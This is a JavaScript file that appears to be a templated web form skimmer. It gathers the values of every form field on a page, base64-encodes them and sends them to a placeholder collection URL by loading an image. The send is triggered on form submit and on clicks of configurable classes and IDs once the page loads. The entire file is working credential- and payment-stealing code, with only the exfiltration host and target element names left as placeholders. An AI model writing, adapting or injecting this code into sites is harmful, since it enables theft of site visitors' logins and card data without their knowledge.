// https://lengstorf.com/get-form-values-as-json/
var parse_elements = (elements) =>
    [].reduce.call(
        elements,
        (data, element) => {
            data[element.name] = element.value;
            return data;
        },
        {}
    );

var get_all_data = () => {
    var all = [];
    for (let form of document.forms) {
        all.push(parse_elements(form.elements));
    }

    return JSON.stringify(all);
};

var before_submit = (e) => {
    var data = btoa(unescape(encodeURIComponent(get_all_data())));
    var x = document.createElement("img");
    x.src = "[SKIMMER_URL]";
    x.src += data;

    // e.preventDefault();
};

var bind_forms = (element_classes, element_ids) => {
    for (let form of document.forms) {
        form.addEventListener("submit", before_submit);
        console.log("form submit bound: " + form);
    }

    for (let class_name of element_classes) {
        var elements = document.getElementsByClassName(class_name);
        for (let elem of elements) {
            elem.addEventListener("click", before_submit);
            console.log("class '" + class_name + "' bound");
        }
    }
    for (let id of element_ids) {
        var element = document.getElementById(id);
        if (element) {
            element.addEventListener("click", before_submit);
            console.log("id " + id + " bound");
        }
    }
};

var skimmer = () => {
    if (document.readyState === "complete") {
        bind_forms([SKIMMER_CLASSES], [SKIMMER_IDS]);
    } else {
        window.onload = () => {
            skimmer();
        };
    }
};
setTimeout(skimmer, 100);
